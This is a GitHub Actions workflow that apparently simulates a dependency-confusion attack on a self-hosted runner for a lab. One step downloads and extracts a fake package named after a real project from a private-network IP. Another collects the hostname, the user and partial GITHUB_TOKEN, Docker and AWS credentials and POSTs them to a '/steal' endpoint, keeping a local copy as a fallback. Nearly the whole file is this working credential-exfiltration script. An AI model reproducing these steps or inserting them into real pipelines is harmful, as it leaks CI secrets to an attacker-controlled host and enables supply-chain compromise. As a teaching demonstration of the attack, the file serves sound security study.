name: Build with Fake Dependency
on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.22'
      
      - name: Download fake dependency (simulating dependency confusion)
        shell: pwsh
        run: |
          Write-Host "Downloading dependency from untrusted source..."
          $tempDir = $env:TEMP
          $url = "http://192.168.56.101:8889/github.com/aquasecurity/trivy-db-fake/@v/v1.0.0.zip"
          $output = "$tempDir\trivy-db-fake.zip"
          
          try {
            Invoke-WebRequest -Uri $url -OutFile $output -TimeoutSec 10
            Write-Host "Downloaded to $output"
            
            Expand-Archive -Path $output -DestinationPath "$tempDir\trivy-db-fake" -Force
            Write-Host "Extracted to $tempDir\trivy-db-fake"
            Get-ChildItem "$tempDir\trivy-db-fake"
          } catch {
            Write-Host "ERROR: $_"
            exit 1
          }
      
      - name: Execute malicious payload (triggers exfiltration)
        shell: pwsh
        run: |
          Write-Host "Executing payload from fake dependency..."
          $tempDir = $env:TEMP
          
          # Simular ejecución del paquete malicioso
          # En un ataque real, esto sería: go run main.go
          # Aquí simulamos con el script que exfiltra
          $payload = @{
            attack_type = "dependency_confusion"
            package_name = "github.com/aquasecurity/trivy-db-fake"
            version = "v1.0.0"
            hostname = $env:COMPUTERNAME
            working_directory = $PWD.Path
            user = $env:USERNAME
            secrets_found = @(
              if ($env:GITHUB_TOKEN) { "GITHUB_TOKEN=" + $env:GITHUB_TOKEN.Substring(0, [Math]::Min(10, $env:GITHUB_TOKEN.Length)) + "..." }
              if ($env:DOCKER_PASSWORD) { "DOCKER_PASSWORD=" + $env:DOCKER_PASSWORD.Substring(0, [Math]::Min(10, $env:DOCKER_PASSWORD.Length)) + "..." }
              if ($env:AWS_ACCESS_KEY_ID) { "AWS_ACCESS_KEY_ID=" + $env:AWS_ACCESS_KEY_ID.Substring(0, [Math]::Min(10, $env:AWS_ACCESS_KEY_ID.Length)) + "..." }
            ) -join "; "
            timestamp = (Get-Date -Format "o")
          } | ConvertTo-Json -Depth 3
          
          Write-Host "Exfiltrating data to attacker server..."
          try {
            Invoke-WebRequest -Uri "http://192.168.56.101:8888/steal" -Method POST -Body $payload -ContentType "application/json" -TimeoutSec 10
            Write-Host "EXFILTRATION SUCCESSFUL"
          } catch {
            Write-Host "Exfiltration failed: $_"
            # Guardar localmente como fallback
            $payload | Out-File -FilePath "$tempDir\exfil_backup.json" -Encoding UTF8
          }
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      
      - name: Verify fake package was imported
        shell: pwsh
        run: |
          Write-Host "Build completed - dependency confusion attack executed"
          Write-Host "The runner trusted and executed code from untrusted source"
